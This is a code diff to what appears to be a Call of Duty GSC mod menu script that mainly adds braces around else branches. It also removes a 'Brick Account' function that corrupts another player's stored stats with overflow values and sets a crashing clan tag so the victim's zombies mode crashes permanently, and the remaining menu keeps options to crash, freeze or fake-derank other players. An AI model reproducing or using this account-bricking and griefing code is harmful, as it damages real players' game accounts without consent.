@@ -76,7 +76,6 @@ PopulatePlayerOptions(menu, player)
                 self addOpt("Fake Derank", ::FakeDerank, player);
                 self addOpt("Fake Damage", ::FakeDamagePlayer, player);
                 self addOpt("Crash Game", ::CrashPlayer, player);
-                self addOpt("Brick Account", ::BrickAccountPlayer, player);
             break;
         
         case "Disable Actions":
@@ -111,7 +110,9 @@ FreezePlayer(player)
         }
     }
     else
+    {
         player FreezeControls(false);
+    }
 }
 
 KickPlayer(player)
@@ -175,7 +176,9 @@ DisableAiming(player)
         }
     }
     else
+    {
         player AllowAds(true);
+    }
 }
 
 DisableJumping(player)
@@ -193,7 +196,9 @@ DisableJumping(player)
         }
     }
     else
+    {
         player AllowJump(true);
+    }
 }
 
 DisableSprinting(player)
@@ -211,7 +216,9 @@ DisableSprinting(player)
         }
     }
     else
+    {
         player AllowSprint(true);
+    }
 }
 
 DisableOffhands(player)
@@ -229,7 +236,9 @@ DisableOffhands(player)
         }
     }
     else
+    {
         player EnableOffHandWeapons();
+    }
 }
 
 DisableWeaps(player)
@@ -247,7 +256,9 @@ DisableWeaps(player)
         }
     }
     else
+    {
         player EnableWeapons();
+    }
 }
 
 SetPlayerStance(stance, player)
@@ -367,7 +378,9 @@ FlashLoop(player)
         }
     }
     else
+    {
         player StopShellShock();
+    }
 }
 
 SpinPlayer(player)
@@ -398,7 +411,9 @@ BlackScreenPlayer(player)
             player.BlackScreenHud[player.BlackScreenHud.size] = player createRectangle("CENTER", "CENTER", 0, 0, 5000, 5000, (0, 0, 0), 0, 1, "black");
     }
     else
+    {
         destroyAll(player.BlackScreenHud);
+    }
 }
 
 FakeLag(player)
@@ -446,7 +461,9 @@ AttachSelfToPlayer(player)
         }
     }
     else
+    {
         self Unlink();
+    }
 }
 
 ApplyShellShock(shock, player)
@@ -500,33 +517,4 @@ CrashPlayer(player)
         return self iPrintlnBold("^1ERROR: ^7Can't Crash Player");
     
     player iPrintlnBold("^B");
-}
-
-/*
-        If you feel the need to cry about this script, please dm me on discord so I can personally tell you to fuck off :P
-        The same people crying about it, are the ones always talking about RCE being a huge concern.
-        In that case, this script should be the least of their concerns lol
-        
-        Easy fix: use serious's t7 patch
-
-    - CF4_99
-*/
-BrickAccountPlayer(player)
-{
-    if(player IsHost())
-        return self iPrintlnBold("^1ERROR: ^7You Can't Brick The Host's Account");
-    
-    if(player isDeveloper())
-        return self iPrintlnBold("^1ERROR: ^7You Can't Brick The Developer's Account");
-    
-    //These stats will brick the barracks for zombies -- It will crash the players game every time they try to open the zombies mode barracks
-    //This also makes sure they can't just reset their zombie stats to get rid of the clantag that crashes them
-    player SetDStat("PlayerStatsList", "plevel", "StatValue", 2147483647);
-    player SetDStat("PlayerStatsList", "paragon_rank", "StatValue", 2147483647);
-    player SetDStat("PlayerStatsList", "paragon_rankxp", "StatValue", 2147483647);
-
-    //This will brick zombies for the player -- Anytime they try to access zombies, they will crash
-    SetClanTag("^B", player);
-    wait 0.1;
-    UploadStats(player);
 }
